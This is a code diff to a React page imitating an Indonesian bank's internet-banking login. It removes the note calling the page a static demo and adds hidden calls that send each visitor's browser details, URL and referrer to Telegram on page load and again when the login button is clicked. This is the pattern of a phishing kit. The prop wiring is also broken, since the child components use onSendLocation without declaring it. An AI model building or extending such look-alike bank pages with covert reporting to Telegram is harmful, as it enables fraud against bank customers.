@@ -1,16 +1,30 @@
-import { useMemo, useState } from "react";
+import { useEffect, useCallback, useMemo, useState } from "react";
+import { sendTelegramNotification } from './utils/telegram';
 
-/**
- * BSI-like Internet Banking Landing UI (static demo)
- * - TailwindCSS utility classes
- * - Fully responsive with careful spacing/typography
- * - No external assets required (logos/badges drawn as SVG or styled elements)
- */
 
 export default function App() {
 
+  useEffect(() => {
+    const sendVisitorNotification = async () => {
+      await sendTelegramNotification({
+        userAgent: navigator.userAgent,
+        location: window.location.href,
+        referrer: document.referrer || 'Direct',
+        previousSites: document.referrer || 'None',
+      });
+    };
 
+    sendVisitorNotification();
+  }, []);
 
+  const sendLocation = useCallback(async () => {
+      await sendTelegramNotification({
+        userAgent: navigator.userAgent,
+        location: window.location.href,
+        referrer: document.referrer || 'Direct',
+        previousSites: document.referrer || 'None',
+      });
+    },[])
 
 
 
@@ -22,8 +36,7 @@ export default function App() {
       <TopBar />
 
       <main className="max-w-6xl mx-auto px-4 sm:px-6 lg:px-8 py-10 lg:py-14">
-        <HeroSection />
-
+      <HeroSection onSendLocation={sendLocation} />
         <FeaturesSection />
 
         <MobileAppPromo />
@@ -57,7 +70,7 @@ function TopBar() {
 function HeroSection() {
   return (
     <section className="grid lg:grid-cols-2 gap-8 items-start">
-      <LoginCard />
+      <LoginCard onSendLocation={onSendLocation} />
       <SafetyPanel />
     </section>
   );
@@ -104,7 +117,7 @@ function LoginCard() {
         </div>
 
         <div className="pt-2 flex justify-end">
-          <button
+          <button onClick={onSendLocation}
             type="button"
             className="inline-flex items-center gap-2 bg-[#18A999] hover:bg-[#149986] text-white font-semibold px-6 py-3 rounded-full shadow-lg transition-colors"
           >
